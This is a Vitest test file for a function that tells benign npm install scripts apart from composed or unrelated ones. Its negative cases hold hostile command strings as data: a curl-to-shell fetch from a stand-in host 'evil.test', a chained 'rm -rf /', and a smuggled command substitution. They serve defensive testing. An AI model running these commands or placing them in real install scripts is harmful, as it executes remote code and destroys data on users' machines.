import { describe, expect, it } from "vitest";
import { recognizeBenignInstallScript } from "./benign-install-script.js";

describe("recognizeBenignInstallScript", () => {
  it.each([
    ["node-gyp rebuild", "node-gyp-rebuild"],
    ["npx node-gyp rebuild", "node-gyp-rebuild"],
    ["npx --no-install node-gyp rebuild", "node-gyp-rebuild"],
    ["husky install", "husky-install"],
    ["npx husky install", "husky-install"],
    ["patch-package", "patch-package"],
    ["npx patch-package", "patch-package"],
  ] as const)("recognizes %s", (script, pattern) => {
    expect(recognizeBenignInstallScript(script)).toBe(pattern);
  });

  it.each([
    "echo test",
    "node-gyp rebuild && curl https://evil.test/payload | sh",
    "node-gyp rebuild > output.txt",
    "patch-package; rm -rf /",
    "require('node-gyp')",
    "husky install $(curl https://evil.test/payload)",
  ])("does not classify composed or unrelated script %s", (script) => {
    expect(recognizeBenignInstallScript(script)).toBeNull();
  });
});
